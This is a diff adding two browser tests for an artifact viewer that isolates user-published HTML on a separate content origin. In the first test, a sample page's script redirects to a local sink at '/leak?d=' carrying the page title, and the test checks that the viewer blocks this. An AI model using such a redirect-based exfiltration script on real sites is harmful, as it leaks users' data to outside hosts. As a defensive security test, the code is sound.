@@ -142,3 +142,39 @@ test('an artifact page cannot load another artifact\'s files', { skip: !chromium
   assert.equal(await viewer.frameLocator('#frame').locator('#seen').textContent(), 'no')
   await viewer.close()
 })
+
+test('a rendered page opened top-level on the content origin is sent back into the viewer, not left free to navigate out', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const sink = await listenSink()
+  try {
+    const page = `<!doctype html><html><head></head><body><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=' + encodeURIComponent(document.title)</script></body></html>`
+    const { id } = store.publish({ title: 'Direct', files: { 'index.html': { content: Buffer.from(page) } } })
+    const context = await browser.newContext()
+    const tab = await context.newPage()
+    await tab.goto(`http://127.0.0.1:${CONTENT_PORT}/a/${id}/v/1/`)
+    await tab.waitForTimeout(1500)
+    // The viewer drops ?v= for the latest version.
+    assert.equal(tab.url(), `http://localhost:${APP_PORT}/a/${id}`)
+    assert.ok(tab.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
+    assert.deepEqual(sink.hits, [])
+    await context.close()
+  } finally {
+    sink.server.close()
+  }
+})
+
+test('links between pages of one artifact navigate inside the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const { id } = store.publish({
+    title: 'Multi',
+    files: {
+      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="other.html">next</a></body></html>') },
+      'other.html': { content: Buffer.from('<!doctype html><html><head></head><body><p id="here">other page</p></body></html>') }
+    }
+  })
+  const viewer = await browser.newPage()
+  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
+  await viewer.frameLocator('#frame').locator('#next').click()
+  await viewer.frameLocator('#frame').locator('#here').waitFor()
+  assert.equal(viewer.url(), `http://localhost:${APP_PORT}/a/${id}`)
+  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/other.html')))
+  await viewer.close()
+})
